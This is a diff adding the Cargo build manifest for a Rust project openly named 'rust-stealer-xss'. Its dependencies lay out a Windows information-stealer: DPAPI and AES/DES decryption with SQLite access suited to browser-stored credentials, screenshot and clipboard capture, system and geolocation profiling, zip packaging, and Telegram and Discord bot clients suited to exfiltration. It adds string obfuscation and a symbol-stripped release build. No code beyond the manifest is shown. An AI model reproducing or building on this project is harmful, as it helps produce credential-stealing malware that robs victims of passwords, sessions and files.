@@ -1,0 +1,45 @@
+[package]
+name = "rust-stealer-xss"
+version = "0.1.0"
+edition = "2021"
+
+# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html
+
+[dependencies]
+app_dirs = { package = "app_dirs2", version = "2.3" }
+rusqlite = { version = "0.27.0", features = ["bundled"]}
+aes-gcm = "0.9.4"
+serde = { version = "1.0.138", features = ["derive"] }
+serde_json = "1.0.82"
+base64 = "0.13.0"
+winapi = { version = "0.3.9", features = ["winuser", "dpapi", "errhandlingapi"] }
+globwalk = "0.8.1"
+walkdir = "2"
+zip = "0.6.1"
+screenshots = "0.3.1"
+whoami = "1.2.1"
+sysinfo = "0.24.5"
+frankenstein = "0.19"
+tokio = { version = "1", features = ["macros", "fs", "rt-multi-thread", "rt"] }
+ipgeolocate = "0.3.5"
+wmi = "0.9.3"
+regex = "1.6.0"
+serenity = { version = "0.11", features = ["rustls_backend", "model"]} 
+der-parser = "8.1.0"
+ring = "0.16"
+aes = "0.6.0"
+block-modes = "0.7.0"
+sha1 = "0.6.0"
+des = "0.6.0"
+hyper = { version = "0.14.2", features = ["client"], default-features = false }
+obfstr = "0.4.0"
+clipboard-win = "4.2.1" # too lazy to do it with winapi
+once_cell = "1.13.0"
+
+[profile.release] # optimize file size 
+lto = true
+codegen-units = 1
+opt-level = "z"
+panic = "abort"
+debug  = false
+strip = "symbols"
